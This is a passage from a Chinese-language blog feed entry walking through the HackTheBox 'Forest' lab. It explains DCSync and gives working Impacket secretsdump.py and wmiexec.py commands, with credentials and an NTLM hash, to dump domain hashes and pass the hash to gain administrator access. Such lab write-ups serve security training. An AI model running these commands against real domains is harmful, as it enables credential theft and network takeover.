id="DCSync攻击导出域内哈希">DCSync攻击导出域内哈希</h2><ul><li>DCSync攻击原理</li></ul><blockquote><p><strong>主要利用的是域控制器之间的数据同步复制</strong></p><p>当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。<br>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p></blockquote><p>用户想要发起<code>DCSync</code>攻击，必须获得以下任一用户的权限</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>之前我们已经创建了一个有<code>DCSync</code>权限的用户，我们可以使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py popayw:'123abc!'@10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704150548072-705369653.png" alt="image-20240704150539216"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h2 id="PTH传递攻击获取Root">PTH传递攻击获取Root</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704151153151-1244754650.png" alt="image-20240704151145045"></p><p>成功拿到管理员用户的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704151425592-732615984.png" alt="image-20240704151417342"></p><p>最后也是在<code>desktop</code>获取<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Forest</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
